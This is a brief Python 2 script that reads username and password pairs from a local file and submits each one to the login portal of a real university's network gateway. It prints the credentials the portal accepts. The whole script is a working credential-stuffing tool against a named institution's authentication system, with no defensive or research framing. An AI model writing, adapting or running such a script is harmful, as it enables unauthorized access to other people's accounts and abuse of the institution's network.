# -*- coding: utf-8 -*
import sys,re
reload(sys)
sys.setdefaultencoding( "utf-8" )

p = open("password","r")
pa=p.readlines()
p.close()
n=1
def Post(urls,data):
    import urllib2
    request = urllib2.Request(urls,data)
    res=urllib2.urlopen(request,timeout=10)
    if res.getcode()!=200:
        return 'There is something Wrong'
    return res.read()
for i in pa:
    i = i.split(" ")
    user = i[1]
    password = i[2]
    c=Post("http://ipgw.neu.edu.cn:804/srun_portal_phone.php?ac_id=1&","action=login&ac_id=1&user_ip=&nas_ip=&user_mac=&url=&username="+user+"&password="+password+"&save_me=0")
    if re.findall('网络已连接',c)!=[]:
        print user,password
    elif re.findall('You are already online',c)!=[]:
        print user,password
    else:
        print n
        n=n+1
